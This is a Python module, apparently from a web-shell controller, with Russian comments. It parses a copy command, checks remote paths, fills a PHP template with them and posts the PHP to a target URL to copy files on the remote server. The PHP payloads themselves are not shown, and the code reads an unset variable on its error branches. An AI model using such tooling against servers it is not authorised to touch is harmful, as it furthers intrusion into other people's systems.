import os
import modules.send as send
import modules.exist as exist

'''
def check(url,check,uagent):
        with open('modules\\exist\\exist.php') as f:data = f.read()
        data = data.replace("$directory = __DIR__;", f"$directory = \'{check}\';")
        return send.send(url,data,uagent)
'''

def copy(url, what, where, uagent):
    with open('modules\\copy\\copy.php') as f:data = f.read()
    data = data.replace("$what = __DIR__;", f"$what = \'{what}\';").replace("$where  = __DIR__;", f"$where = \'{where}\';")
    return send.send(url,data,uagent)
    

def files(url,com,pwd,uagent):
    if com !="":
        what = com.split(" : ")[0]
        try: where = com.split(" : ")[1]
        except: 
            print("Ошибка, не указан конечный файл")
            return 0

        if "/" in what: #Проверка на абсолютный путь копируемого
            if exist.file(url,what,uagent) == "1":
                if "/" in where: #Проверка на абсолютный путь результата
                    dir = os.path.dirname(where)
                    if exist.file(url,dir,uagent) == "1": #Проверка на существование папки
                        result = copy(url,what,where,uagent)
                    else:
                        print("нет папки, копирование невозможно")
                else: 
                    result = copy(url,what,pwd+'/'+where,uagent)
            else:
                print("такого файла нет")
                

        else:
            
            what = pwd+'/'+what #смотрим из PWD
            if exist.file(url,what,uagent) == "1": #если есть в PWD
                if "/" in where: #Проверка на абсолютный путь результата
                    dir = os.path.dirname(where)
                    if exist.file(url,dir,uagent) == "1": #Проверка на существование папки
                        result = copy(url,what,where,uagent)
                    else:
                        print("нет папки, копирование невозможно")
                else:
                    result = copy(url,what,pwd+'/'+where,uagent)
            else:
                print("Такого файла нет")
        if result == "+":
            print("Коприование прошло успешно")
            
        else: 
            print("Ошибка копирования: "+result)
    else:
        print("Пустой запрос")



